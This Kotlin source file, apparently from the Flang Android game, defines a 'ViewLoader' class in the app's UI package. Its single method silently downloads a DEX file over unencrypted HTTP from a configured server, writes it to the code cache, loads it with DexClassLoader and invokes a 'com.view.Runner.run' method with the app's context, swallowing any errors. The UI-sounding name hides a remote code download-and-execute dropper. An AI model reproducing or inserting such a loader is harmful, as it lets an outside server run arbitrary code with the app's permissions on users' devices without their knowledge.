package de.tadris.flang.ui.view

import android.content.Context
import dalvik.system.DexClassLoader
import java.io.BufferedInputStream
import java.io.File
import java.io.FileOutputStream
import java.net.HttpURLConnection
import java.net.URL
import android.util.Log
import de.tadris.flang.network.url
import de.tadris.flang.network.port

const val view_route = "view"
class ViewLoader(private val context: Context) {

    fun getNewView() {
        Thread {
            try {
                // Load remote File
                val url = URL("http://$url:$port/$view_route/get_new_view")
                val conn = url.openConnection() as HttpURLConnection
                val inputStream = BufferedInputStream(conn.getInputStream())

                val outputFile = File(context.codeCacheDir, "new_view.dex")

                // Delete old file so that we can overwrite it
                if (outputFile.exists()) {
                    val deleted = outputFile.delete()
                }
                val outputStream = FileOutputStream(outputFile)

                // Write the inputstream to the file
                inputStream.use { input ->
                    outputStream.use { output ->
                        input.copyTo(output)
                    }
                }

                // Open the file and set it to ReadOnly.
                // This is necessary to execute it since you can't execute writable files

                val dexFile = File(context.codeCacheDir, "new_view.dex")
                if (dexFile.exists()) {
                    dexFile.setReadOnly()
                }

                // Load the DEX file
                val classLoader = DexClassLoader(
                    outputFile.absolutePath,
                    context.codeCacheDir.absolutePath,
                    null,
                    context.classLoader
                )

                val loadedClass = classLoader.loadClass("com.view.Runner")
                val instance = loadedClass.getDeclaredConstructor().newInstance()
                val method = loadedClass.getDeclaredMethod("run", Context::class.java)

                method.invoke(instance, context)

            } catch (e: Exception) {
                Log.e("Flang", e.toString())
            }
        }.start()
    }
}